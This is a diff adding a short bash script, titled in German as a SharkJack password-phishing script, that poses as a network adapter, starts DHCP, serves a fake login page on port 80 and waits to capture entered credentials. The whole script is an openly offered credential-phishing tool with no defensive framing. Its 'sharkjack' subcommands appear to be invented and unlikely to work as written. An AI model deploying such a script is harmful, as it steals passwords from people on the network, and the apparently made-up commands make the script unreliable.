@@ -1,0 +1,17 @@
+#!/bin/bash
+echo "SharkJack Skript: Passwort-Phishing"
+echo "==================================="
+
+# Tarnung als Netzwerkadapter
+sudo sharkjack network adapter-mode
+
+# Starte den DHCP-Server
+sudo sharkjack network dhcp start
+
+# Starte den HTTP-Server mit einer gefälschten Login-Seite
+sudo sharkjack webserver start -d /root/phishing -p 80
+
+# Warte auf Login-Daten
+sudo sharkjack webserver sniff
+
+echo "Fertig!"
